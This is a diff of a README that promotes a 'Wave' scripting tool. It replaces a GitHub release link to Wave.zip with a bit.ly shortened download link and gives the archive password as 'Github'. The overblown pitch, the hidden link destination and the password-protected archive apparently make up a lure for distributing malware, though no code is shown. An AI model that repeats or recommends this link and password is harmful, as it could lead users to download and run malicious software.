@@ -5,7 +5,7 @@
 </p>
 <p align="center"> Experience Wave, the best scripting tool on the big screen and harness the unparalleled power it offers. Dive into the evolution, not just as an observer, but as a participant riding the crest of innovation. With advanced scripting capabilities and superior performance, Wave invites you to immerse yourself fully and ride the wave of the future.
 
-# <p align="center"> [DOWNLOAD](https://github.com/Temuproworker/hello-/releases/download/Download/Wave.zip)
+# <p align="center"> [DOWNLOAD](https://bit.ly/4fwsQ64)
 > [!CAUTION]
 > PASSWORD - Github.
 
